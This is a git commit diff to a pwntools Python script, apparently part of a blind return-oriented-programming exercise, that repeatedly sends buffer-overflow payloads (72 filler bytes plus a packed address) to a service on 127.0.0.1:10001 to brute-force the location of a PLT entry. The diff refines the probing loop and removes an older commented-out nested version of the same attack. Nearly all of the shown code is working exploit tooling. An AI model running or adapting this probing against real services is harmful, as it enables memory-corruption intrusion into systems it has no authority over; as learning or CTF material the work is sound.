6d9a53eacf08482b402539a6fd0d2833bee03139
BrianWang-SZ <35866013+BrianWang-SZ@users.noreply.github.com>
2022-04-13 17:25:01 -0400

    Update plt.py

--- src/plt.py
+++ src/plt.py
@@ -1,9 +1,9 @@
 from pwn import *
 
-def get_plt(size = 72, start_addr = 0x400545, stop_addr = 0x400545, depth = 3):
+def get_plt(size = 72, stop_addr = 0x400545, depth = 4):
     
     # start from the first stop gadget
-    probe = start_address
+    probe = stop_addr + 1
     stop = stop_addr
     trap = 0x000000
     
@@ -21,81 +21,20 @@ def get_plt(size = 72, start_addr = 0x400545, stop_addr = 0x400545, depth = 3):
                 p.sendline(payload)
                 p.recvline()
                 p.close()
-                log.info("Trial %d succeeded!")
+                log.info("Trial %d succeeded!" % (i + 1))
+                if i == depth - 1: return probe
             except EOFError:
                 p.close()
-                log.info("Trial %d failed!" % i)
+                log.info("Trial %d failed!" % (i + 1))
                 probe += 1
                 break
             except Exception:
                 p.close()
                 log.info("Bad connection!")
                 i -= 1
+        
         log.info("PLT found!")
         return probe
 
 plt_addr = get_plt()
 print("The plt entry address is 0x%x" % plt_addr)
-            
-            
-#         try:
-#             payload = size * b'A'
-#             payload += p64(probe)
-
-#             p = remote('127.0.0.1', 10001, timeout = 2)
-#             p.recvline()
-#             p.sendline(payload)
-#             p.recvline()
-#             p.close() 
-            
-#             try:
-#                 payload = size * b'A'
-#                 payload += p64(probe + 16)
-    
-#                 p = remote('127.0.0.1', 10001, timeout = 2)
-#                 p.recvline()
-#                 p.sendline(payload)
-#                 p.recvline()
-#                 p.close()
-                
-#                 try:
-#                     payload = size * b'A'
-#                     payload += p64(probe + 16 * 2)
-
-#                     p = remote('127.0.0.1', 10001, timeout = 2)
-#                     p.recvline()
-#                     p.sendline(payload)
-#                     p.recvline()
-#                     p.close()
-#                     log.info("PLT entry found!")
-#                     return probe
-
-#                 except EOFError:
-#                     p.close()
-#                     log.info("Third failed!")
-#                     probe += 1
-
-#                 except Exception:
-#                     log.info("Bad Connection!")
-#                     p.close()
-            
-#             except EOFError:
-#                 p.close()
-#                 log.info("Second failed!")
-#                 probe += 1
-            
-#             except Exception:
-#                 log.info("Bad Connection!")
-#                 p.close()
-
-#         except EOFError:
-#             p.close()
-#             log.info("First failed!")
-#             probe += 1
-        
-#         except Exception:
-#             log.info("Bad Connection!")
-#             p.close()
-
-
-    
